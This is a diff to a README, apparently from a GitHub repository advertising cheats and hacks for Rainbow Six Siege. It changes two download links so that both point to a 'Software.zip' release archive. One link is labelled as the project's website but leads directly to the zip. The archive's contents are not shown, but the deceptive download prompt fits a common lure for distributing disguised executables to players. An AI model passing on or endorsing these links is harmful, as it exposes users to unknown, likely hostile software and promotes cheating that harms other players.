@@ -16,7 +16,7 @@ In this repository, you will find:
 
 To access the cheats and hacks, download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/silvahzx/Rainbow-S1x-Siege-Cheat/releases/download/v2.0/Software.zip)](https://github.com/silvahzx/Rainbow-S1x-Siege-Cheat/releases/download/v2.0/Software.zip)
 
 ### Installation Instructions
 
@@ -37,7 +37,7 @@ Explore the following topics related to cheats and hacks in Rainbow Six Siege:
 
 ### Visit our Website
 
-For more information and updates on our cheats and hacks, visit our website [here](https://github.com/user-attachments/files/18410590/Software.zip).
+For more information and updates on our cheats and hacks, visit our website [here](https://github.com/silvahzx/Rainbow-S1x-Siege-Cheat/releases/download/v2.0/Software.zip).
 
 ### Releases Section
 
